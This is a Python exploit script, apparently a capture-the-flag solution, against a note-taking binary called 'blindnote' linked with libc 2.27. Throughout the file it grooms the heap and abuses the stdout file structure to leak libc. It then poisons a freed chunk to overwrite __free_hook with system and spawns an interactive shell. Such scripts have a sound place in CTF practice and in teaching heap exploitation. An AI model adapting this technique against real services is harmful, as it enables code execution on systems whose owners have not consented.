from ptrlib import *

def create(data):
    sock.sendlineafter("> ", "1")
    sock.sendlineafter(": ", data)
    return

def delete(index):
    sock.sendlineafter("> ", "3")
    sock.sendlineafter(": ", str(index))
    return

libc = ELF("../distfiles/libc-2.27.so")
sock = Process("../distfiles/blindnote")
#sock = Socket("0.0.0.0", 80)

# prepare unsorted bin
for i in range(8):
    create("AAAAAAAA")
delete(7)
delete(6)
delete(5)
delete(2)
delete(3)
delete(1) # --> points to chunk:3, which is nearby chunk:4
delete(0)
delete(4) # unsorted bin!

# libc leak
payload  = b'A' * 0x98 + p64(0xa1)
payload += b'\xe0'
create(payload) # 0
payload  = b'A' * 0x98 + p64(0xa1)
payload += b'A' * 0x98 + p64(0xa1)
payload += b'A' * 0x98 + p64(0xa1) # overwrite chunk:4 from chunk:1
#payload += b'\x60\x07\xdd'
payload += b'\x60\x77'
create(payload) # 1
create("dummy") # 2
payload  = p64(0xfbad1800)
payload += p64(0) * 3
payload += b'\x08'
create(payload) # 3
libc_base = u64(sock.recv(8)) - 0x3ed8b0
logger.info("libc = " + hex(libc_base))

# house of spirit
delete(1)
delete(0)
payload = b'A' * 0x98 + p64(0xa1) + p64(libc_base + libc.symbol('__free_hook'))
create(payload) # 0
create("/bin/sh\0") # 1
create(p64(libc_base + libc.symbol('system')))

# get the shell!
delete(1)

sock.interactive()
